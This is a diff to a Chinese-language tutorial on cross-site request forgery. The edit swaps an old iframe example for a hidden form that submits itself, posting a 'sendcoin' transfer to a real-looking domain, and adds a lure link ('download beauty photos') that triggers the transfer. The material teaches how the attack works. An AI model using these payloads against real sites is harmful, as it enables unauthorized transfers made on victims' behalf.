@@ -35,30 +35,36 @@ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF 攻
 
 #### 2.3 使用 POST 请求完成转账操作
 
-```
-<html>
-　　<head>
-　　　　<script type="text/javascript">
-　　　　　　function steal()
-　　　　　　{
-          　　　　 iframe = document.frames["steal"];
-　　     　　      iframe.document.Submit("transfer");
-　　　　　　}
-　　　　</script>
-　　</head>
+除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码：
 
-　　<body onload="steal()">
-　　　　<iframe name="steal" display="none">
-　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
-　　　　　　　　<input type="hidden" name="toBankId" value="11">
-　　　　　　　　<input type="hidden" name="money" value="1000">
-　　　　　　</form>
-　　　　</iframe>
-　　</body>
+```
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>黑客的站点：CSRF攻击演示</h1>
+  <form id='hacker-form' action="https://time.geekbang.org/sendcoin" method=POST>
+    <input type="hidden" name="user" value="hacker" />
+    <input type="hidden" name="number" value="100" />
+  </form>
+  <script> document.getElementById('hacker-form').submit(); </script>
+</body>
 </html>
 ```
 
+在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交。
+
 #### 2.3 引诱用户点击链接
+
+除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：
+
+```
+<div>
+  <img width=150 src=http://images.xuejuzi.cn/1612/1_161230185104_1.jpg> </img> </div> <div>
+  <a href="https://time.geekbang.org/sendcoin?user=hacker&number=100" taget="_blank">
+    点击下载美女照片
+  </a>
+</div>
+```
 
 总结：CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！
 
